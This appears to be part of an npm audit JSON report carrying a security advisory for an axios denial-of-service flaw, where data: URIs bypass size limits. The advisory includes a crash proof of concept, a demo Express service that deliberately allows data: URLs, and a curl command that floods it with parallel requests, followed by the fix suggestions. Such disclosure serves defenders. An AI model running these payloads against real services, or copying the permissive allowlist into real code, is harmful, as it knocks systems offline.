+      "overview": "## Summary\n\nWhen Axios runs on Node.js and is given a URL with the `data:` scheme, it does not perform HTTP. Instead, its Node http adapter decodes the entire payload into memory (`Buffer`/`Blob`) and returns a synthetic 200 response.\nThis path ignores `maxContentLength` / `maxBodyLength` (which only protect HTTP responses), so an attacker can supply a very large `data:` URI and cause the process to allocate unbounded memory and crash (DoS), even if the caller requested `responseType: 'stream'`.\n\n## Details\n\nThe Node adapter (`lib/adapters/http.js`) supports the `data:` scheme. When `axios` encounters a request whose URL starts with `data:`, it does not perform an HTTP request. Instead, it calls `fromDataURI()` to decode the Base64 payload into a Buffer or Blob.\n\nRelevant code from [`[httpAdapter](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L231)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L231):\n\n```js\nconst fullPath = buildFullPath(config.baseURL, config.url, config.allowAbsoluteUrls);\nconst parsed = new URL(fullPath, platform.hasBrowserEnv ? platform.origin : undefined);\nconst protocol = parsed.protocol || supportedProtocols[0];\n\nif (protocol === 'data:') {\n  let convertedData;\n  if (method !== 'GET') {\n    return settle(resolve, reject, { status: 405, ... });\n  }\n  convertedData = fromDataURI(config.url, responseType === 'blob', {\n    Blob: config.env && config.env.Blob\n  });\n  return settle(resolve, reject, { data: convertedData, status: 200, ... });\n}\n```\n\nThe decoder is in [`[lib/helpers/fromDataURI.js](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/helpers/fromDataURI.js#L27)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/helpers/fromDataURI.js#L27):\n\n```js\nexport default function fromDataURI(uri, asBlob, options) {\n  ...\n  if (protocol === 'data') {\n    uri = protocol.length ? uri.slice(protocol.length + 1) : uri;\n    const match = DATA_URL_PATTERN.exec(uri);\n    ...\n    const body = match[3];\n    const buffer = Buffer.from(decodeURIComponent(body), isBase64 ? 'base64' : 'utf8');\n    if (asBlob) { return new _Blob([buffer], {type: mime}); }\n    return buffer;\n  }\n  throw new AxiosError('Unsupported protocol ' + protocol, ...);\n}\n```\n\n* The function decodes the entire Base64 payload into a Buffer with no size limits or sanity checks.\n* It does **not** honour `config.maxContentLength` or `config.maxBodyLength`, which only apply to HTTP streams.\n* As a result, a `data:` URI of arbitrary size can cause the Node process to allocate the entire content into memory.\n\nIn comparison, normal HTTP responses are monitored for size, the HTTP adapter accumulates the response into a buffer and will reject when `totalResponseBytes` exceeds [`[maxContentLength](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L550)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L550). No such check occurs for `data:` URIs.\n\n\n## PoC\n\n```js\nconst axios = require('axios');\n\nasync function main() {\n  // this example decodes ~120 MB\n  const base64Size = 160_000_000; // 120 MB after decoding\n  const base64 = 'A'.repeat(base64Size);\n  const uri = 'data:application/octet-stream;base64,' + base64;\n\n  console.log('Generating URI with base64 length:', base64.length);\n  const response = await axios.get(uri, {\n    responseType: 'arraybuffer'\n  });\n\n  console.log('Received bytes:', response.data.length);\n}\n\nmain().catch(err => {\n  console.error('Error:', err.message);\n});\n```\n\nRun with limited heap to force a crash:\n\n```bash\nnode --max-old-space-size=100 poc.js\n```\n\nSince Node heap is capped at 100 MB, the process terminates with an out-of-memory error:\n\n```\n<--- Last few GCs --->\n…\nFATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory\n1: 0x… node::Abort() …\n…\n```\n\nMini Real App PoC:\nA small link-preview service that uses axios streaming, keep-alive agents, timeouts, and a JSON body. It allows data: URLs which axios fully ignore `maxContentLength `, `maxBodyLength` and decodes into memory on Node before streaming enabling DoS.\n\n```js\nimport express from \"express\";\nimport morgan from \"morgan\";\nimport axios from \"axios\";\nimport http from \"node:http\";\nimport https from \"node:https\";\nimport { PassThrough } from \"node:stream\";\n\nconst keepAlive = true;\nconst httpAgent = new http.Agent({ keepAlive, maxSockets: 100 });\nconst httpsAgent = new https.Agent({ keepAlive, maxSockets: 100 });\nconst axiosClient = axios.create({\n  timeout: 10000,\n  maxRedirects: 5,\n  httpAgent, httpsAgent,\n  headers: { \"User-Agent\": \"axios-poc-link-preview/0.1 (+node)\" },\n  validateStatus: c => c >= 200 && c < 400\n});\n\nconst app = express();\nconst PORT = Number(process.env.PORT || 8081);\nconst BODY_LIMIT = process.env.MAX_CLIENT_BODY || \"50mb\";\n\napp.use(express.json({ limit: BODY_LIMIT }));\napp.use(morgan(\"combined\"));\n\napp.get(\"/healthz\", (req,res)=>res.send(\"ok\"));\n\n/**\n * POST /preview { \"url\": \"<http|https|data URL>\" }\n * Uses axios streaming but if url is data:, axios fully decodes into memory first (DoS vector).\n */\n\napp.post(\"/preview\", async (req, res) => {\n  const url = req.body?.url;\n  if (!url) return res.status(400).json({ error: \"missing url\" });\n\n  let u;\n  try { u = new URL(String(url)); } catch { return res.status(400).json({ error: \"invalid url\" }); }\n\n  // Developer allows using data:// in the allowlist\n  const allowed = new Set([\"http:\", \"https:\", \"data:\"]);\n  if (!allowed.has(u.protocol)) return res.status(400).json({ error: \"unsupported scheme\" });\n\n  const controller = new AbortController();\n  const onClose = () => controller.abort();\n  res.on(\"close\", onClose);\n\n  const before = process.memoryUsage().heapUsed;\n\n  try {\n    const r = await axiosClient.get(u.toString(), {\n      responseType: \"stream\",\n      maxContentLength: 8 * 1024, // Axios will ignore this for data:\n      maxBodyLength: 8 * 1024,    // Axios will ignore this for data:\n      signal: controller.signal\n    });\n\n    // stream only the first 64KB back\n    const cap = 64 * 1024;\n    let sent = 0;\n    const limiter = new PassThrough();\n    r.data.on(\"data\", (chunk) => {\n      if (sent + chunk.length > cap) { limiter.end(); r.data.destroy(); }\n      else { sent += chunk.length; limiter.write(chunk); }\n    });\n    r.data.on(\"end\", () => limiter.end());\n    r.data.on(\"error\", (e) => limiter.destroy(e));\n\n    const after = process.memoryUsage().heapUsed;\n    res.set(\"x-heap-increase-mb\", ((after - before)/1024/1024).toFixed(2));\n    limiter.pipe(res);\n  } catch (err) {\n    const after = process.memoryUsage().heapUsed;\n    res.set(\"x-heap-increase-mb\", ((after - before)/1024/1024).toFixed(2));\n    res.status(502).json({ error: String(err?.message || err) });\n  } finally {\n    res.off(\"close\", onClose);\n  }\n});\n\napp.listen(PORT, () => {\n  console.log(`axios-poc-link-preview listening on http://0.0.0.0:${PORT}`);\n  console.log(`Heap cap via NODE_OPTIONS, JSON limit via MAX_CLIENT_BODY (default ${BODY_LIMIT}).`);\n});\n```\nRun this app and send 3 post requests:\n```sh\nSIZE_MB=35 node -e 'const n=+process.env.SIZE_MB*1024*1024; const b=Buffer.alloc(n,65).toString(\"base64\"); process.stdout.write(JSON.stringify({url:\"data:application/octet-stream;base64,\"+b}))' \\\n| tee payload.json >/dev/null\nseq 1 3 | xargs -P3 -I{} curl -sS -X POST \"$URL\" -H 'Content-Type: application/json' --data-binary @payload.json -o /dev/null```\n```\n\n---\n\n## Suggestions\n\n1. **Enforce size limits**\n   For `protocol === 'data:'`, inspect the length of the Base64 payload before decoding. If `config.maxContentLength` or `config.maxBodyLength` is set, reject URIs whose payload exceeds the limit.\n\n2. **Stream decoding**\n   Instead of decoding the entire payload in one `Buffer.from` call, decode the Base64 string in chunks using a streaming Base64 decoder. This would allow the application to process the data incrementally and abort if it grows too large.",
+      "reported_by": null,
+      "title": "Axios is vulnerable to DoS attack through lack of data size check",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-58754"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "axios",
+      "vulnerable_versions": "<1.12.0",
+      "github_advisory_id": "GHSA-4hjh-wcwx-xvwj",
+      "recommendation": "Upgrade to version 1.12.0 or later",
+      "patched_versions": ">=1.12.0",
+      "updated": "2025-09-15T14:19:46.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-4hjh-wcwx-xvwj"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 11,
+      "moderate": 7,
+      "high": 22,
+      "critical": 4
+    },
+    "dependencies": 1436,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 1436
+  }
+}
